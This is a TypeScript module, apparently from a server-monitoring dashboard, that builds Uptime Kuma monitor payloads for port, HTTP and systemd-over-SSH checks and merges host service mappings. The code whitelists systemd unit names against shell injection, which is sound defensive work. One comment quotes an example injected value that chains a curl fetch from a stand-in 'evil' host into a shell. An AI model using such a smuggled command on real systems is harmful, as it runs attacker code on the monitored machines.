import { t } from '../i18n.js'
import { shortGroup, type ServiceRule } from '../metrics/services.js'

// 「添加主机」时顺带建观测项：三类模板 → kuma-monitor add 的 payload。
// 命名沿用现有约定「<组短名> / <服务名>」，这样观测页的 shortName() 还能剥掉前缀；
// chip 映射走 host-services.json 的 monitor:<id>（精确钉死），所以名字随便改也不影响跳转。
export type HostIdentity = { id: string; label?: string }

/** 组名：有显示名就用显示名（惯例 <机器别名> (厂商 · 区域)），否则退回 id。 */
export function groupNameFor(host: HostIdentity): string {
  const label = String(host.label ?? '').trim()
  return label && label !== host.id ? label : host.id
}

export type SshSpec = { user: string; key: string; port?: number }
export type ProvisionInput = {
  hostId: string
  address: string
  groupName: string
  port?: number
  http?: { url: string; keyword?: string }
  services?: { unit: string; ssh: SshSpec }[]
}
/** unit 只在 systemd 模板里有：建完要拿 id 写回 host-services.json 的映射。 */
export type PlannedMonitor = { name: string; payload: Record<string, unknown>; unit?: string }

/** systemd 单元名白名单：systemctl 认的字符集，故意不含空格、分号、引号、$ 与反引号。 */
const UNIT_RE = /^[A-Za-z0-9_.@:-]+$/

/** 观测项名字（前缀 = 组短名，观测页会剥掉）。 */
function monitorName(groupName: string, hostId: string, tail: string): string {
  const short = shortGroup(groupName) || hostId
  return short + ' / ' + tail
}

/**
 * 把抽屉里勾的模板摊成要建的观测项，顺序固定：端口 → HTTP → 服务。
 * 纯函数：不碰网络、不读文件，SSH 私钥内容由调用方读好传进来。
 */
export function planMonitors(input: ProvisionInput): PlannedMonitor[] {
  const address = String(input.address ?? '').trim()
  const out: PlannedMonitor[] = []

  if (input.port !== undefined && input.port !== null) {
    const port = input.port
    if (!Number.isInteger(port) || port < 1 || port > 65535) {
      throw new Error(t('端口必须是 1–65535 的整数：{port}', { port: String(port) }))
    }
    if (!address) throw new Error(t('缺少主机地址，端口探测没法建'))
    const name = monitorName(input.groupName, input.hostId, '端口 ' + port + '（TCP）')
    out.push({ name, payload: { type: 'port', name, hostname: address, port } })
  }

  if (input.http) {
    const url = String(input.http.url ?? '').trim()
    if (!/^https?:\/\//i.test(url)) throw new Error(t('HTTP 站点地址要以 http:// 或 https:// 开头：{url}', { url }))
    const name = monitorName(input.groupName, input.hostId, 'HTTP 站点')
    const keyword = String(input.http.keyword ?? '').trim()
    const payload: Record<string, unknown> = { type: 'http', name, url, method: 'GET', maxredirects: 10 }
    if (keyword) payload.keyword = keyword
    out.push({ name, payload })
  }

  for (const svc of input.services || []) {
    const unit = String(svc.unit ?? '').trim()
    const ssh = svc.ssh
    if (!unit) throw new Error(t('systemd 服务缺单元名'))
    // unit 会拼进 ssh_command（'systemctl is-active ' + unit），Kuma 在目标机上按 shell 执行；
    // 不卡字符集的话 'nginx; curl evil|sh' 会真的跑起来（坑 49）。
    if (!UNIT_RE.test(unit)) throw new Error(t('单元名只能是字母、数字、点、下划线、@、冒号、短横线：{unit}', { unit }))
    if (!address) throw new Error(t('缺少主机地址，systemd 探测没法建'))
    if (!ssh || !String(ssh.user ?? '').trim()) throw new Error(t('systemd 探测需要 SSH 用户名'))
    if (!String(ssh.key ?? '').trim()) throw new Error(t('systemd 探测需要 SSH 私钥内容'))
    const name = monitorName(input.groupName, input.hostId, unit + ' 服务')
    out.push({
      name,
      unit,
      payload: {
        type: 'ssh', name, hostname: address, port: ssh.port || 22,
        ssh_username: String(ssh.user).trim(), ssh_auth_method: 'privateKey',
        ssh_private_key: String(ssh.key), ssh_command: 'systemctl is-active ' + unit,
      },
    })
  }

  return out
}

/**
 * 把新映射并进 host-services.json：同 host+unit 覆盖 monitor id，其余原样保序，新的追加。
 * （覆盖而不是重复，否则 resolveUnitMonitors 会一直命中旧的那条。）
 */
export function mergeServiceRules(existing: ServiceRule[], additions: ServiceRule[]): ServiceRule[] {
  const out = (existing || []).map((r) => ({ ...r }))
  for (const add of additions || []) {
    const i = out.findIndex((r) => r.host === add.host && r.unit === add.unit)
    if (i >= 0) out[i] = { ...add }
    else out.push({ ...add })
  }
  return out
}
